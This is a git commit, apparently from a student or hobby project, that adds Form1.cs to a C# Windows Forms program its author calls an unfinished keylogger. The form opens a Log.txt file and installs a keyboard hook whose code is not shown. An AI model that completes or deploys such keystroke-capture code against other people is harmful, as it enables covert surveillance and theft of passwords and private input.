c71b9a1762e3b6d4ae6001da465a035f74296c5f
Yura <semenov.1995.ru@yandex.ru>
2015-09-19 22:36:58 +0300

    Это недоработанный кейлогер

---
+++ KeyLoger_proc/Form1.cs
@@ -0,0 +1,40 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+namespace KeyLoger_proc
+{
+   
+    public partial class Form1 : Form
+    {
+        public static StreamWriter write;
+        public Form1()
+        {
+            InitializeComponent();
+        }
+     
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            FileStream fs;
+            fs = new FileStream("Log.txt", FileMode.Append, FileAccess.Write);
+            write = new StreamWriter(fs);
+          Hook h = new Hook();
+            h.SetHook();
+            
+        }
+
+        private void Form1_Deactivate(object sender, EventArgs e)
+        {
+
+            
+            write.WriteLine("Выполнен выход  " + DateTime.Now.ToString());
+            write.Close();
+        }
+    }
+}
